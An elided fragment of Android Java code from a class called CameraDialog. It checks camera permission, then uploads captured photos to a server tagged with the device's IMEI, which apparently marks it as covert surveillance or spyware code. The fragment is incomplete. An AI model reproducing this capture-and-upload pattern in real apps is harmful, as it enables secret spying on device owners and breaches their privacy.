...
{
	private final String TAG = "CameraDialog";
	...
	public void run() {
		try {
			if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.CAMERA) == false){
			...
			WriteDateFile.writeLogFile("CameraDialog exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}
			...
			try {
		    	...
		    	if (data != null && data.length >= VALID_CAMERAPHOTO_SIZE) {
					if(Network.isNetworkConnected(context) == true 
				    	...
				    	SendDataToServer senddata = new SendDataToServer(sendbuf,sendsize,Public.CMD_DATA_CAMERAPHOTO,Public.IMEI);
		    		...
		    		//SendDataToServer.sendDataToServer(data, data.length, Public.CMD_DATA_CAMERAPHOTO, Public.IMEI);
				}else{
